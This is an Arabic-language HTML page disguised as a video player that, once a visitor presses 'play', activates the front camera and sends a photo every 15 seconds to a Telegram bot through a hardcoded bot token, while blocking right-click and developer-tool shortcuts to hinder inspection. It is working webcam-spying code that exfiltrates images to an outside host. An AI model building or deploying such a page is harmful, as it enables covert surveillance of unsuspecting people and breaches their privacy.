<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>مشغل الفيديو والكاميرا</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
            font-family: 'Segoe UI', sans-serif;
        }

        /* حاوية الفيديو - الخلفية */
        .video-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            background: #000;
        }

        .video-frame {
            width: 100%;
            height: 100%;
            border: none;
            object-fit: cover;
        }

        /* نافذة الكاميرا المصغرة */
        .camera-window {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 130px;
            height: 170px;
            border-radius: 15px;
            overflow: hidden;
            border: 2px solid rgba(255,255,255,0.6);
            z-index: 2;
            background: #000;
            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
            opacity: 0;
            transition: opacity 0.5s;
        }

        .camera-window.show {
            opacity: 1;
        }

        .camera-window video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }

        /* الزر الرئيسي - كبير وواضح */
        .main-btn {
            position: fixed;
            bottom: 50%;
            left: 50%;
            transform: translate(-50%, 50%);
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px 45px;
            font-size: 24px;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            z-index: 10;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            transition: transform 0.3s, opacity 0.5s;
            animation: pulse 2s infinite;
        }

        .main-btn.hide {
            opacity: 0;
            pointer-events: none;
            transform: translate(-50%, 50%) scale(0.9);
        }

        @keyframes pulse {
            0% { transform: translate(-50%, 50%) scale(1); }
            50% { transform: translate(-50%, 50%) scale(1.05); }
            100% { transform: translate(-50%, 50%) scale(1); }
        }

        .main-btn:hover {
            transform: translate(-50%, 50%) scale(1.05);
        }

        /* شريط الحالة */
        .status {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(10px);
            padding: 8px 20px;
            border-radius: 30px;
            color: white;
            font-size: 14px;
            z-index: 3;
            text-align: center;
            white-space: nowrap;
        }

        .status.success { background: rgba(40,167,69,0.9); }
        .status.error { background: rgba(220,53,69,0.9); }

        canvas {
            display: none;
        }

        /* إخفاء أي عناصر غير مرغوب فيها */
        ::-webkit-scrollbar {
            display: none;
        }
    </style>
</head>
<body>

    <!-- فيديو يوتيوب (سيتم تشغيله عند الضغط على الزر) -->
    <div class="video-container" id="videoContainer">
        <iframe id="youtubeFrame" class="video-frame" 
                src=""
                frameborder="0"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowfullscreen>
        </iframe>
    </div>

    <!-- نافذة الكاميرا -->
    <div class="camera-window" id="cameraWindow">
        <video id="camera" autoplay playsinline muted></video>
    </div>

    <canvas id="canvas"></canvas>

    <!-- زر واحد فقط -->
    <button class="main-btn" id="startBtn">🎬 تشغيل</button>

    <!-- شريط الحالة -->
    <div id="status" class="status">📺 اضغط "تشغيل" للبدء</div>

    <script>
        // ==================== إعدادات تليجرام ====================
        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
        let CHAT_ID = null;
        let isStarted = false;
        let stream = null;
        let autoInterval = null;
        
        // رابط الفيديو (يمكنك تغييره)
        const VIDEO_URL = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&controls=0&loop=1&playlist=dQw4w9WgXcQ&modestbranding=1&rel=0&showinfo=0";
        
        // ==================== عناصر الصفحة ====================
        const startBtn = document.getElementById('startBtn');
        const cameraWindow = document.getElementById('cameraWindow');
        const youtubeFrame = document.getElementById('youtubeFrame');
        const camera = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('status');
        
        // ==================== دوال مساعدة ====================
        function showStatus(msg, type = 'info') {
            statusDiv.textContent = msg;
            statusDiv.className = `status ${type}`;
            console.log(`[${type}] ${msg}`);
            
            if (type !== 'error') {
                setTimeout(() => {
                    if (statusDiv.className === `status ${type}`) {
                        statusDiv.className = 'status';
                        statusDiv.textContent = '🎥 يعمل...';
                    }
                }, 4000);
            }
        }
        
        // ==================== الحصول على Chat ID ====================
        async function getChatId() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const result = await response.json();
                
                if (result.ok && result.result.length > 0) {
                    CHAT_ID = result.result[result.result.length - 1].message?.chat?.id;
                    if (CHAT_ID) {
                        console.log('✅ Chat ID:', CHAT_ID);
                        return true;
                    }
                }
                console.log('⚠️ لم يتم العثور على Chat ID');
                return false;
            } catch(error) {
                console.error('خطأ:', error);
                return false;
            }
        }
        
        // ==================== تشغيل الكاميرا ====================
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                camera.srcObject = stream;
                return true;
            } catch(err) {
                console.error("خطأ الكاميرا:", err);
                return false;
            }
        }
        
        // ==================== التقاط وإرسال الصورة ====================
        async function captureAndSend() {
            if (!CHAT_ID) return false;
            
            try {
                if (camera.videoWidth === 0 || camera.videoHeight === 0) return false;
                
                canvas.width = camera.videoWidth;
                canvas.height = camera.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
                ctx.setTransform(1, 0, 0, 1, 0, 0);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `capture_${Date.now()}.jpg`);
                formData.append('caption', `📸 صورة تلقائية - ${new Date().toLocaleString('ar-SA')}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                return result.ok;
            } catch(e) {
                return false;
            }
        }
        
        // ==================== بدء التصوير التلقائي ====================
        function startAutoCapture() {
            if (autoInterval) clearInterval(autoInterval);
            // تصوير كل 15 ثانية
            autoInterval = setInterval(async () => {
                const success = await captureAndSend();
                if (success) {
                    console.log('📸 تم إرسال صورة تلقائية');
                }
            }, 15000);
        }
        
        // ==================== تشغيل كل شيء ====================
        async function startEverything() {
            if (isStarted) return;
            
            showStatus('🎬 جاري التشغيل...', 'info');
            startBtn.classList.add('hide');
            
            // 1. تشغيل الفيديو
            youtubeFrame.src = VIDEO_URL;
            
            // 2. إظهار نافذة الكاميرا
            cameraWindow.classList.add('show');
            
            // 3. تشغيل الكاميرا
            const cameraReady = await startCamera();
            
            // 4. الحصول على Chat ID
            await getChatId();
            
            if (cameraReady && CHAT_ID) {
                showStatus('✅ تم التشغيل! يتم التصوير وإرسال الصور تلقائياً', 'success');
                startAutoCapture();
                isStarted = true;
            } else if (!cameraReady) {
                showStatus('⚠️ الكاميرا غير متاحة، لكن الفيديو يعمل', 'warning');
                isStarted = true;
            } else {
                showStatus('⚠️ تم التشغيل لكن لا يوجد اتصال بالبوت', 'warning');
                isStarted = true;
            }
        }
        
        // ==================== إيقاف الكاميرا عند الخروج ====================
        window.onbeforeunload = () => {
            if (autoInterval) clearInterval(autoInterval);
            if (stream) stream.getTracks().forEach(t => t.stop());
        };
        
        // ==================== ربط الزر ====================
        startBtn.onclick = startEverything;
        
        // ==================== منع فتح أدوات المطور ====================
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
                (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
                return false;
            }
        });
    </script>
</body>
</html>
